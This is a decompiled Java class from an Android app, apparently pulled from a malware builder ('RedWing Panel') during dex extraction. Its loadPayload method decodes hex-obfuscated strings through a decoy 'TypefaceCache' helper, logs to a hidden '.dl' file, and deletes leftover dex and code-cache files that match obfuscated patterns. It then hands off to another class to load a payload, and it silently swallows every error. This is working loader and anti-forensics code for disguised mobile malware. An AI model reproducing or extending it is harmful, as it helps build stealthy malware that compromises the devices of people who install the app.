package app.mobilex.plus.util;

import android.content.Context;
import java.io.File;
import v.s.u4HKFgCbgUKtEQ;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class UtilKNController {
    public static volatile boolean dDIMxZXP1V8HdM;
    public static final StringBuilder vekpFI4d1Nc4fakF = new StringBuilder();
    public static File w9sT1Swbhx3hs;

    public static void dDIMxZXP1V8HdM(Context context, String str) {
        StringBuilder sb = vekpFI4d1Nc4fakF;
        sb.append(str);
        sb.append("|");
        try {
            if (w9sT1Swbhx3hs == null) {
                w9sT1Swbhx3hs = new File(context.getFilesDir(), ".dl");
            }
            File file = w9sT1Swbhx3hs;
            if (file != null) {
                u4HKFgCbgUKtEQ.dTS0S7eC32ubQH54j36(file, str + "\n");
            }
        } catch (Throwable unused) {
        }
    }

    public static final boolean isLoaded() {
        return dDIMxZXP1V8HdM;
    }

    private static /* synthetic */ void kvvnmizlc() {
    }

    public static final boolean loadPayload(Context context) {
        File[] fileArrListFiles;
        File[] fileArrListFiles2;
        if (dDIMxZXP1V8HdM) {
            return true;
        }
        dDIMxZXP1V8HdM(context, TypefaceCache.obtain("002F00660001009400E400BE00C000B30063007A0052008500AD") + UtilYWProcessor.dDIMxZXP1V8HdM + TypefaceCache.obtain("006300730049009500AD") + UtilYWProcessor.w9sT1Swbhx3hs);
        boolean zDc = false;
        try {
            File dataDir = context.getDataDir();
            if (dataDir != null && (fileArrListFiles2 = dataDir.listFiles()) != null) {
                for (File file : fileArrListFiles2) {
                    if (file.getName().startsWith(TypefaceCache.obtain("000200780054008900E900B200DD00B20030003B007F008200E8009900DB00AB0026"))) {
                        file.delete();
                    }
                }
            }
        } catch (Throwable unused) {
        }
        try {
            File codeCacheDir = context.getCodeCacheDir();
            if (codeCacheDir != null && codeCacheDir.exists() && (fileArrListFiles = codeCacheDir.listFiles()) != null) {
                for (File file2 : fileArrListFiles) {
                    if (file2.getName().endsWith(TypefaceCache.obtain("006D0072005E009F")) || file2.getName().endsWith(TypefaceCache.obtain("006D0079005F008200E8")) || file2.getName().endsWith(TypefaceCache.obtain("006D0060005F008200E8")) || file2.getName().startsWith("p.")) {
                        file2.delete();
                    }
                }
            }
        } catch (Throwable unused2) {
        }
        try {
            if (UtilYWProcessor.dDIMxZXP1V8HdM) {
                zDc = UtilYWProcessor.dc(context);
            }
        } catch (Throwable unused3) {
        }
        dDIMxZXP1V8HdM = zDc;
        dDIMxZXP1V8HdM(context, TypefaceCache.obtain("002F00660001008900F100AB00DB00B10026002B") + zDc + TypefaceCache.obtain("0063007A0054008600F400BA00D600FA") + dDIMxZXP1V8HdM);
        return zDc;
    }
}
